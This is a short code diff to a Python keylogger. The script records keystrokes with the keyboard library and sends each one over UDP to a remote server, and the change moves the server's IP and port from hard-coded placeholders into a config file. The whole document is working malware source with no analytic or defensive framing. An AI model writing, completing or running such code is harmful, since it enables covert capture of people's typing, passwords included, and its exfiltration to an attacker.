@@ -1,5 +1,6 @@
 import socket
 import keyboard
+from utils import read_config
 
 def send_keystrokes(server_ip, server_port):
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -11,7 +12,8 @@ def send_keystrokes(server_ip, server_port):
         client_socket.sendto(key_data.encode('utf-8'), server_address)
 
 if __name__ == "__main__":
-    SERVER_IP = '0.0.0.0'   #temp
-    SERVER_PORT = 9999      #temp
+    config = read_config('config.json')
+    SERVER_IP = config['server_ip']
+    SERVER_PORT = config['server_port']
 
     send_keystrokes(SERVER_IP, SERVER_PORT)
